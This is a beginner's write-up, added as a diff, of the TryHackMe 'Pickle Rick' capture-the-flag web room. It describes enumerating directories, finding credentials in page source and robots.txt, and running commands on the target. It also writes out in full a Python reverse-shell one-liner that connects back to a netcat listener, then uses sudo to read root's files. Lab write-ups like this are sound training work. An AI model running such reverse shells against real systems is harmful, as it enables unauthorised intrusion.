@@ -1,1 +1,57 @@
+CTF Name: - PICKLE RICK
 
+Category: - Web Expoiltation
+Difficulty: - Easy
+Website: - TryHackMe
+
+Description: -
+This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and 
+transform himself back into a human from a pickle.
+
+Ip address given is 10.201.122.220
+
+Part 01: - Analysing the Ip address
+
+At the first step i wanted to find the website so i tried the basic http://10.201.122.220/ which led to a page where Rick was asking for help that 
+he turned to a pickle. During my time in THM web hacking rooms i learned that page source always contain some important notes so i went to the page source which gave me a 
+username to work with which is "R1ckRul3s". I got stuck on what to do i tried nmap scan but it didnt gave me any vuln or and just open 22 port ssh which i cant access 
+without the key. So i went with my gut and tried gobusters dir enumeration with the seclist wordlist and gave a lot of dir like ./htaccess, ./htpasswd, /index.html,
+/robot.txt, /login.php. So i went ot login page with http://10.201.122.220/login.php which asked for username and password i didnt had any password so i tried brute forcing with 
+hydra which failed. I had saw robot.txt dir which i tried and it gave me a bunch of words "Wubbalubbadubdub" which is ironically the password. So i entered both and gained 
+access to the command page which was perfect.
+
+Part 02: - Command Line
+
+I tried the ls command which gave me a bunch of txt and php file which are Sup3rS3cretPickl3Ingred.txt, assets, clue.txt, denied.php, index.html, login.php, 
+portal.php, robots.txt. So i tried cat the files which failed telling me command disabled. So i was stuck on it for an 1 hour before i asked a hint from echo which told 
+me use "sudo read filename" which i tried with Sup3rS3cretPickl3Ingred.txt which gave me my first ingriendent which is "mr. meeseek hair" which worked as my first flag.
+Then i tried using same command on clue.txt which told me check between different files which was not possible however much i tried.
+
+Part 03: - Reverse shell
+
+So after some reasearch i decided to use reverse shell i learned in shells overview to gain shell access.So i went with the command "nc -lnvp 443" in my linux terminal then i 
+tried various ways to gain shell in command which all failed for some reason so i asked echo he told me to use python3. So i asked ChatGPT for a python script for reverse shell
+in a CTF and it gave me a python3 script {python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("My ip",nc port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.
+spawn("bash")'} which worked fine after some changes in My ip and nc port which was my linux ip add and 443 which worked and it gave me shell access which can be used 
+to find all the flags which was easy as one was in /home/rick/' second ingriendient ' and the third was in root folder.
+
+Part 04: - Final File
+To gain access to the root folder i tried all the ways such as "cd root", "sudo cd root", "su", "./root" which all failed so i tried "sudo ls root" which worked fine so i went
+with the cat command which is "sudo cat /root/3rd.txt" which gave me my final flags.
+
+TOOLS USED: -
+Nmap
+Gonusters
+Python script
+Netcat
+Nano
+
+FLAGS
+First Flag: - mr meeseeks hair
+Second Flage: - 1 Jerry tear
+Third Flags; - Fleeb juices
+Note: - The flags have been altered to avoid cheating so dont cheat but try it yourselves
+
+# This is my first CTF and my first CTF report if you find any errror od issue please let me know.
+
+THANKS FOR READING AND HAPPY HACKING
